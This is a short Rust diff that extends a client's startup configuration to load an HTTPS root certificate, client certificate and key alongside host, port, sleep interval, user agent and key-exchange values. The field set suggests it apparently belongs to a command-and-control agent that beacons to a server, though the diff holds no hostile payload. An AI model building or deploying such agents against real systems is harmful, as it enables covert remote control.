@@ -17,7 +17,17 @@ include!(concat!(env!("OUT_DIR"), "/init.rs"));
 
 #[tokio::main]
 async fn main() {
-    let (proto, host, port, sleep, user_agent, server_public_key) = init();
+    let (
+        proto,
+        host,
+        port,
+        sleep,
+        user_agent,
+        https_root_cert,
+        https_client_cert,
+        https_client_key,
+        server_public_key,
+    ) = init();
 
     let server_public_key = decode(server_public_key.as_bytes());
     let server_public_key = vec_u8_to_u8_32(server_public_key).unwrap();
@@ -32,10 +42,14 @@ async fn main() {
         port,
         sleep,
         user_agent.to_string(),
+        https_root_cert.to_string(),
+        https_client_cert.to_string(),
+        https_client_key.to_string(),
         server_public_key,
         my_secret_key,
         my_public_key,
         shared_secret,
+
     );
     run(config).await.unwrap()
 }
